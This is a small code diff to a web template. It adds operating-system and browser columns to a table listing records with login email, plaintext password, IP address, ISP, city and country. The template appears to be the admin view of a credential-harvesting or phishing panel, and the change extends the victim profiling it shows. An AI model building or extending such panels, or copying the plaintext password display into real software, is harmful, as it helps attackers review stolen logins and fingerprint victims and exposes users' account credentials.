@@ -15,6 +15,8 @@
                     <th>email</th>
                     <th>password</th>
                     <th>ip</th>
+                    <th>os</th>
+                    <th>browser</th>
                     <th>isp</th>
                     <th>city</th>
                     <th>country</th>
@@ -27,6 +29,8 @@
                     <td>{{ $dataP->login_email }}</td>
                     <td>{{ $dataP->login_password }}</td>
                     <td>{{ $dataP->ip }}</td>
+                    <td>{{ $dataP->os }}</td>
+                    <td>{{ $dataP->browser }}</td>
                     <td>{{ $dataP->isp }}</td>
                     <td>{{ $dataP->city }}</td>
                     <td>{{ $dataP->country }}</td>
